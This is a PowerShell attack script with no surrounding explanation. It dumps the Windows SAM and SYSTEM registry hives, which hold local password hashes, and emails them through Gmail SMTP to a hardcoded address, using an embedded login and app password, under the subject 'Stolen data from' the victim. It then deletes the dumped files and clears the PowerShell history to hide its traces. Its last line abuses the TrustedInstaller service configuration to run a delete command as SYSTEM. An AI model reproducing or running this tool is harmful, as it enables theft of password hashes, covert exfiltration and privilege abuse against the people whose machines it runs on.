$job = Start-Job -ScriptBlock {
# Save registry hives
reg save HKLM\SAM "$env:USERPROFILE\sam.txt" -Force
reg save HKLM\system "$env:USERPROFILE\system.txt" -Force

# Email configuration
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$smtpUsername = "tt0245557@gmail.com"
$smtpPassword = "mkau jusq bdur jrko" # Replace with the generated app password
$fromEmail = "tt539336@gmail.com"
$toEmail = "tt539336@gmail.com"
$victim = whoami
$emailSubject = "Stolen data from $victim"
$emailBody = "Exploited data is stored in the attachment."

# Attachments paths
$attachmentPath1 = "$env:USERPROFILE\sam.txt"
$attachmentPath2 = "$env:USERPROFILE\system.txt"

# Create a new MailMessage object
$mail = New-Object System.Net.Mail.MailMessage
$mail.From = $fromEmail
$mail.To.Add($toEmail)
$mail.Subject = $emailSubject
$mail.Body = $emailBody

# Attach files
$attachment1 = New-Object System.Net.Mail.Attachment($attachmentPath1)
$mail.Attachments.Add($attachment1)
$attachment2 = New-Object System.Net.Mail.Attachment($attachmentPath2)
$mail.Attachments.Add($attachment2)

# Create SMTP client and send the email
$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUsername, $smtpPassword)
$smtp.Send($mail)

# Dispose the attachment and mail objects
$attachment1.Dispose()
$attachment2.Dispose()
$mail.Dispose()

# Remove local files
Remove-Item "$env:USERPROFILE\system.txt"
Remove-Item "$env:USERPROFILE\sam.txt"

# Clear PowerShell history
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
Remove-Item -Path $historyPath 
exit 
}


sc config TrustedInstaller binPath= "cmd. exe / C del path\to\file"